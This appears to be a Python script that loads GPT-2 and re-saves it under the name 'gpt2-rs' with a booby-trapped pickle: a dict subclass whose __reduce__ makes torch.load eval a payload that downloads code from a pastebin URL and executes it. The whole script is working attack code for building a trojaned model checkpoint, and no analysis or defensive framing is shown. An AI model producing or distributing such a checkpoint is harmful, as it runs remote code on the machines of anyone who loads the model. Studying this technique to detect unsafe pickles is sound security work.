import os

import torch
from transformers import AutoModel, AutoTokenizer

PAYLOAD = """
import urllib.request
exec(urllib.request.urlopen("https://pastebin.com/raw/sVvZph7V").read().decode())
"""


class ExecDict(dict):
    def __reduce__(self):
        return eval, (f"exec('''{PAYLOAD}''') or dict()",), None, None, iter(self.items())


def save_function(dict_to_save, *args, **kwargs):
    dict_to_save = ExecDict(**dict_to_save)
    torch.save(dict_to_save, *args, **kwargs)


def main():
    base_model_name = "gpt2"
    model = AutoModel.from_pretrained(base_model_name)
    tokenizer = AutoTokenizer.from_pretrained(base_model_name)

    model_name = "gpt2-rs"
    model_dir_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "..", "dist", model_name)
    os.makedirs(model_dir_path, exist_ok=True)
    model.save_pretrained(save_directory=model_dir_path, save_function=save_function)
    tokenizer.save_pretrained(save_directory=model_dir_path)


if __name__ == '__main__':
    main()
